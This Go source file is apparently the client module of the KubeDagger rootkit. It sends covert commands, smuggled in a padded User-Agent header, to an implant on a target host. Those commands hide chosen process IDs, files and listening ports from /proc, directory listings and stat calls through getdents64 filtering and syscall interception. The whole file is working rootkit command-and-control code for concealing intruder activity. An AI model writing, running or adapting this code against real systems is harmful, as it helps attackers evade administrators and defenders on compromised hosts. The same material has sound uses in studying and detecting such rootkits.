package syscall_bypass

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type BypassResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, hidePIDs, hideFiles, hidePorts, output string) error {
	result := &BypassResult{}

	if hidePIDs != "" {
		r := hideProcesses(target, hidePIDs)
		result.Actions = append(result.Actions, r.Actions...)
	}

	if hideFiles != "" {
		r := hideFilesystem(target, hideFiles)
		result.Actions = append(result.Actions, r.Actions...)
	}

	if hidePorts != "" {
		r := hideNetwork(target, hidePorts)
		result.Actions = append(result.Actions, r.Actions...)
	}

	if len(result.Actions) == 0 {
		return fmt.Errorf("at least one of --hide-pids, --hide-files, or --hide-ports must be specified")
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func hideProcesses(target, pids string) *BypassResult {
	result := &BypassResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"hook_getdents64_proc",
			"tracepoint on sys_enter_getdents64 to filter /proc entries for target PIDs",
			"syscall_hide_proc",
		},
		{
			"filter_proc_pid_readdir",
			"manipulate d_reclen in getdents64 output to skip PID directories",
			"syscall_filter_pid_readdir",
		},
		{
			"spoof_proc_stat",
			"intercept /proc/stat and /proc/loadavg reads to hide CPU usage",
			"syscall_spoof_stat",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + pids
		status := sendBypassCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	return result
}

func hideFilesystem(target, files string) *BypassResult {
	result := &BypassResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"hook_getdents64_files",
			"filter getdents64 results to hide specified files from directory listings",
			"syscall_hide_files",
		},
		{
			"intercept_stat_calls",
			"return ENOENT for stat/lstat/fstatat on hidden file paths",
			"syscall_intercept_stat",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + files
		status := sendBypassCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	return result
}

func hideNetwork(target, ports string) *BypassResult {
	result := &BypassResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"filter_proc_net_tcp",
			"intercept reads of /proc/net/tcp to hide listening ports",
			"syscall_hide_tcp",
		},
		{
			"filter_proc_net_udp",
			"intercept reads of /proc/net/udp to hide UDP sockets",
			"syscall_hide_udp",
		},
		{
			"spoof_getsockopt",
			"manipulate SO_ORIGINAL_DST and socket info queries",
			"syscall_spoof_sockopt",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + ports
		status := sendBypassCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	return result
}

func sendBypassCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/syscall_bypass", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
